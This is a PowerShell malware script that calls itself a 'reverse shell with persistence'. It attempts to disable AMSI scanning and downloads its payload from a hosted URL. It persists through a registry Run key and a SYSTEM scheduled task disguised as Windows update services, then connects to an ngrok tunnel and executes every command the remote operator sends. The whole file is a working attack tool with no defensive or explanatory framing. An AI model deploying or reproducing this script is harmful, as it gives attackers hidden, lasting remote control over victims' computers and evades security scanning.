# ============================================
# COMPLETELY FIXED REVERSE SHELL WITH PERSISTENCE
# ============================================

$ErrorActionPreference = "SilentlyContinue"

# YOUR ATTACKER IP
$ip = "0.tcp.in.ngrok.io"
$port = 16450

# 1. FIXED AMSI BYPASS (with null check)
try {
    $assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
    foreach ($assembly in $assemblies) {
        if ($assembly.GetName().Name -eq "System.Management.Automation") {
            $vars = $assembly.GetVariables()
            foreach ($var in $vars) {
                if ($var.Name -eq "amsiInitFailed") {
                    $var.Value = $true
                }
            }
        }
    }
} catch {}

# 2. CREATE PERSISTENCE FIRST (Before shell connection)
$persistencePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$persistenceName = "WindowsUpdateService"
$payloadFile = "$env:TEMP\svcupdate.ps1"

# Get current script content (handle IEX execution where $PSCommandPath is empty)
if ($PSCommandPath -ne "") {
    $scriptContent = Get-Content $PSCommandPath -Raw
} else {
    # When run via IEX, $PSCommandPath is empty, so download the file again
    $wc = New-Object Net.WebClient
    $scriptContent = $wc.DownloadString('https://yourfatherx82.github.io/MY_WEBSITE/payloads/payload.ps1')
}

# Save to temp for persistence
Set-Content $payloadFile -Value $scriptContent -Encoding ASCII

# Set Registry Key (Persistence #1)
New-ItemProperty -Path $persistencePath -Name $persistenceName -Value "powershell.exe -NoP -NonI -W Hidden -File `"$payloadFile`"" -Force

# Create Scheduled Task (Persistence #2)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -File `"$payloadFile`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "WinUpdateCheck" -Action $action -Trigger $trigger -Principal $principal -Force

# 3. FIXED REVERSE SHELL (with retry logic)
# FIXED: Use ${ip} and ${port} to avoid variable parsing issues
Write-Host "Connecting to ${ip}:${port}..." -ForegroundColor Green

$maxRetries = 3
$retry = 0

while ($retry -lt $maxRetries) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
        $stream = $client.GetStream()
        $bytes = New-Object byte[] 1024
        $encoding = New-Object System.Text.UTF8Encoding
        $reader = New-Object System.IO.StreamReader($stream, $encoding)
        
        Write-Host "Connected successfully!" -ForegroundColor Green
        
        while ($client.Connected -and $client.Client.Connected) {
            $data = $reader.ReadLine()
            if ($data) {
                $execute = Invoke-Expression $data 2>&1 | Out-String
                $send = "$execute`r`n`PS $($pwd.Provider.Path)> "
                $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($send)
                $stream.Write($sendBytes, 0, $sendBytes.Length)
                $stream.Flush()
            }
        }
        
        break
    } catch {
        $retry++
        Write-Host "Connection attempt ${retry} failed. Retrying..." -ForegroundColor Yellow
        Start-Sleep -Seconds 2
    }
}

Write-Host "Shell session ended" -ForegroundColor Cyan
